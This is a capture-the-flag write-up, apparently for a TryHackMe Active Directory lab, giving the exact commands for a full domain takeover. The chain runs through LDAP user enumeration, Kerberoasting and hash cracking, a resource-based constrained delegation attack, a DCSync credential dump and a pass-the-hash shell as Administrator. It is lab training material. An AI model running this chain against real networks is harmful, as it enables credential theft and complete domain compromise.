# Operation Endgame

Anonymous/guest allowed, used ldapsearch in order to get list of all users:

```bash
ldapsearch -x -H ldap://$IP -D "guest@domain.htb" -w '' -b "dc=thm,dc=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName > users.txt
sed -i 's/sAMAccountName: //g' users.txt
```

we can authenticate as guest:

![NXC LDAP](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/1.png)

let's try Kerberoasting using:

```bash
impacket-GetUserSPNs thm.local/guest:'' -dc-ip $IP -request
```

Output:

![Kerberosating](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/2.png)

We have a hash now, crack it:

```bash
hashcat -m 13100 Kerberosating.txt ~/wordlist/rockyou.txt --show
```

Output:

![3.png](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/3.png)

Now using bloodhound collect data and now we can see guest holds rights over the DC:

![4](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/4.png)

now we can do RBCD attack:

```bash
rbcd.py THM.LOCAL/guest:"" -dc-ip 10.48.178.208 -delegate-to AD$ -delegate-from CODY_ROY -action write -no-pass -hashes :31D6CFE0D16AE931B73C59D7E0C089C0
```

Output:

![5](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/5.png)

Now we will request the impersonated service ticket using CODY\_ROY's real credentials

```bash
impacket-getST -spn 'ldap/ad.thm.local' -impersonate 'Administrator' -dc-ip 10.48.178.208 'thm.local/CODY_ROY:Redacted
```

Output:

![6](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/6.png)

Now we will DCSync with the resulting ticket:

```bash
export KRB5CCNAME=Administrator@ldap_ad.thm.local@THM.LOCAL.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.48.178.208 -just-dc-user Administrator 'thm.local/Administrator@ad.thm.local'
```

Output:

![7](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/7.png)

We are basically DA now, we can login and get the flag using:

```bash
impacket-smbexec -hashes ':Redacted' 'thm.local/Administrator@10.48.178.208'
```

Output:

![8](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/8.png)

you may view the flag via:

```powershell
type C:\Users\Administrator\Desktop\flag.txt.txt
```
